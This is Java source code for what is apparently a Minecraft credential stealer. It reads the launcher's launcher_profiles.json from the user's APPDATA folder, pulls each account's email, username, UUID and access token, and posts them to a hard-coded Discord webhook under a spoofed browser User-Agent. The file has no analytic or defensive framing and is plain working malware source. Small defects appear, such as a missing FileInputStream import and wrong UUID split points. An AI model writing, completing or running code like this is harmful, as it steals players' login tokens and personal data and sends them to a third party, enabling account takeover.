import org.json.simple.JSONArray;
import org.json.simple.JSONObject;
import org.json.simple.parser.JSONParser;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

public class Main {

    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1212578680635654224/Z3ILBMJJfhhBgBYRKrE06QM3HaPaSRelT5yogL4uPz7rJY9NiYQWQlg5gSs1X_3K0kh3";
    private static final boolean PING_ME = false;

    public static void main(String[] args) {
        try {
            JSONParser parser = new JSONParser();
            String appData = System.getenv("APPDATA");
            BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(appData + "\\.minecraft\\launcher_profiles.json")));
            JSONObject json = (JSONObject) parser.parse(reader);
            JSONObject authDb = (JSONObject) json.get("authenticationDatabase");

            JSONArray embeds = new JSONArray();
            for (Object key : authDb.keySet()) {
                String x = (String) key;
                JSONObject authData = (JSONObject) authDb.get(x);
                String email = (String) authData.get("username");
                Map<String, JSONObject> profiles = (Map<String, JSONObject>) authData.get("profiles");
                Map.Entry<String, JSONObject> entry = profiles.entrySet().iterator().next();
                String uuid = entry.getKey();
                JSONObject displayNameObject = entry.getValue();

                JSONObject embed = new JSONObject();
                JSONArray fields = new JSONArray();
                JSONObject field1 = new JSONObject();
                field1.put("name", "Email");
                field1.put("value", (email != null && email.contains("@")) ? email : "N/A");
                field1.put("inline", false);
                fields.add(field1);

                JSONObject field2 = new JSONObject();
                field2.put("name", "Username");
                field2.put("value", displayNameObject.get("displayName").toString().replace("_", "\\_"));
                field2.put("inline", true);
                fields.add(field2);

                JSONObject field3 = new JSONObject();
                field3.put("name", "UUID");
                field3.put("value", uuidDashed(uuid));
                field3.put("inline", true);
                fields.add(field3);

                JSONObject field4 = new JSONObject();
                field4.put("name", "Token");
                field4.put("value", authData.get("accessToken"));
                field4.put("inline", true);
                fields.add(field4);

                embed.put("fields", fields);
                embeds.add(embed);
            }

            Map<String, String> headers = new HashMap<>();
            headers.put("Content-Type", "application/json");
            headers.put("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11");

            JSONObject payload = new JSONObject();
            payload.put("embeds", embeds);
            payload.put("content", PING_ME ? "@everyone" : "");

            HttpURLConnection connection = (HttpURLConnection) new URL(WEBHOOK_URL).openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11");
            connection.setDoOutput(true);

            connection.getOutputStream().write(payload.toJSONString().getBytes());

            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                String inputLine;
                StringBuffer response = new StringBuffer();
                while ((inputLine = in.readLine()) != null) {
                    response.append(inputLine);
                }
                in.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static String uuidDashed(String uuid) {
        return uuid.substring(0, 8) + "-" + uuid.substring(8, 12) + "-" + uuid.substring(12, 16) + "-" + uuid.substring(16, 21) + "-" + uuid.substring(21, 32);
    }
}
